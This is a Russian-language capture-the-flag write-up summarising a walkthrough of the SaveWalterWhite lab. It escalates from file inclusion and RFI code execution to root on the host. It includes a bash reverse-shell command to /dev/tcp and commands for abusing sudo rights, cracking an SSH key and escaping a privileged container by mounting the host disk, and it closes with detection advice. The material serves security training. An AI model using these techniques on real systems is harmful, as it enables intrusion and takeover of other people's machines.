# SaveWalterWhite: RFI, ошибки прав sudo и выход из контейнера

**Таск:** SaveWalterWhite (aclabs.pro, сезон 6, 5 флагов)
**Источник:** [разбор seobuster на Хабре](https://habr.com/ru/articles/1046229). Ниже — конспект этого прохождения.
**Цепочка:** чтение файлов через `image.php` → RFI → RCE от www-data → доступный для записи sudo-скрипт → резервная копия Borg с парольной фразой в MySQL → authorized_keys через sudo → SUID и OSINT → привилегированный контейнер.

## Первоначальный доступ

Открыты порты 22 и 80. Комментарий в исходном коде страницы указывает на `image.php` с параметром `?file=`. Чтение `/etc/passwd` подтверждает доступ к локальным файлам и показывает пользователей walt, saul и jesse. Само по себе чтение ещё не доказывает включение файла как кода; следующий шаг с RFI подтверждает, что обработчик способен исполнять подключённый PHP-файл.

После неудачных попыток прочитать другие файлы автор переходит к RFI по PayloadsAllTheThings: размещает `cmd.php` на своём http.server и передаёт его URL через Burp. Код выполняется от www-data. Для обратной оболочки в разборе используется обёртка `bash -c`, а команда перед отправкой в Repeater кодируется для URL.

## www-data → jesse

По выводу `sudo -l` www-data может запускать `/opt/scripts/backup.sh` от jesse. Права файла — 777, поэтому скрипт можно перезаписать и запустить:

```bash
echo "bash -c 'bash -i >& /dev/tcp/<ip>/5555 0>&1'" > /opt/scripts/backup.sh
sudo -u jesse /opt/scripts/backup.sh
```

## jesse → saul

В домашнем каталоге jesse находится `saul-back.tar` с репозиторием Borg. Поскольку borg на машине не установлен, автор переносит архив по scp к себе. `borg extract` запрашивает парольную фразу.

В `/var/www/html/admin.php` находятся учётные данные root:root для базы `walter_fund`. На хосте есть PHP, через который автор обращается к MySQL:

```php
php -a
$db = new mysqli("db", "root", "root", "walter_fund");
$db->query("select * from donations");
```

В последней записи donations — парольная фраза от резервной копии. Внутри лежит зашифрованный SSH-ключ saul. После подбора парольной фразы через ssh2john и rockyou автор входит под saul.

## saul → walter

saul может запускать `tee` от walter через sudo. Это позволяет добавить публичный ключ в authorized_keys:

```bash
ssh-keygen -t rsa -N '' -f /tmp/walter
cat /tmp/walter.pub | sudo -u walter /usr/bin/tee -a /home/walter/.ssh/authorized_keys
```

## walter → root → хост

SUID-бинарник и подсказка, связанная с именем Heisenberg, приводят к root внутри контейнера. В `/dev` доступны блочные устройства хоста. Привилегированный режим контейнера позволяет смонтировать файловую систему хоста без эксплуатации уязвимости ядра:

```bash
mkdir /mnt/host_root && mount /dev/sda1 /mnt/host_root
```

## Как обнаружить

На Linux запись в `/opt/scripts` и изменение authorized_keys можно отслеживать через auditd или контроль целостности файлов, если настроено наблюдение за этими путями. Журналы sudo помогают связать запуск скрипта или `tee` с учётной записью. Парольная фраза Borg в доступной приложению БД не создаёт отдельного признака атаки, но указывает на проблему хранения секретов: компрометация приложения открывает и резервную копию.

## Заметка

Права sudo нужно проверять после каждой смены пользователя: у www-data, jesse и saul разные возможности. Шифрование резервной копии здесь не спасает, поскольку из того же окружения удаётся получить парольную фразу. Это свойство конкретной конфигурации, а не Borg в целом.
